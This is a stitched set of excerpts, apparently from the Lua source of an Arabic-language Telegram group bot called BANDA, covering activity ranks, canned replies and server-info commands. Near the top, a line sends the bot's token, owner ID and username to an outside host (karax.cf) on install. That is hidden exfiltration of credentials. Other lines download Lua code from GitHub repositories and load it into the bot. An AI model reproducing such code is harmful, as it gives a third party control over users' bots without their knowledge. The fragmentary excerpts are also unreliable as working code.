...
https.request('http://karax.cf/BANDA/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/KKKU0TEAM/Files_KKKU0/master/File_Bot/commands.lua") 
...
BANDA_Msg = 'قمة التفاعل🤸‍♂️😻' 
elseif msgs < 5500 then 
BANDA_Msg = 'اقوى متفاعل😳😻' 
elseif msgs < 7000 then 
BANDA_Msg = 'ملك التفاعل🤴😍' 
elseif msgs < 9500 then 
BANDA_Msg = 'امبروطور التفاعل💂‍♀️😻' 
elseif msgs < 10000000000 then 
BANDA_Msg = 'رب التفاعل✔️😍'  
end 
return BANDA_Msg 
end
...
if text == 'معلومات السيرفر 📊' and SudoBot(msg) then 
 local text2 = 'Info Server : \n'
  local BANDA1 = database:info()
  text2 = text2..'1 - *Uptime Days* : `'..BANDA1.server.uptime_in_days..'('..BANDA1.server.uptime_in_seconds..' seconds)`\n'
  text2 = text2..'2 - *Commands Processed* : `'..BANDA1.stats.total_commands_processed..'`\n'
  text2 = text2..'3 - *Expired Keys* : `'..BANDA1.stats.expired_keys..'`\n'
  text2 = text2..'4 - *Ops/sec* : `'..BANDA1.stats.instantaneous_ops_per_sec..'`\n'
...
os.execute('wget https://raw.githubusercontent.com/BANDATEAM/BANDA/master/BANDA.lua')
...
send(msg.chat_id_, msg.id_,'📌| عدد المجموعات الان » { '..#group..' }'..BANDAk..''..BANDA..'\n*📌| الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
if SudoBot(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/BANDATEAM/Files_BANDA/master/getfile.json")
if res == 200 then
...
local json_file, res = https.request("https://raw.githubusercontent.com/BANDATEAM/Files_BANDA/master/File_Bot/"..file)
if res == 200 then
...
'كول حبيبي ؟ اني '..Namebot..'',
 'هااا شتريد ولله خبصتني طيح الله حضك.',
'مشغول حالياً ??🌸',
'عمري فداك '..Namebot..' كول حب'
}
send(msg.chat_id_, msg.id_,'['..BANDA_Msg[math.random(#BANDA_Msg)]..']') 
return false
end
...
'\n  هاااا ولك اليوم مغير اسمك شسالفتك 🤔😹',
...
------------------------------------------------------------------------
local KKK_U1BOT = database:get(bot_id.."BANDA1:Add:Filter:Rp2"..text..result.chat_id_)   
if BANDAAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠|العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫|["..KKK_U1BOT.."] \n") 
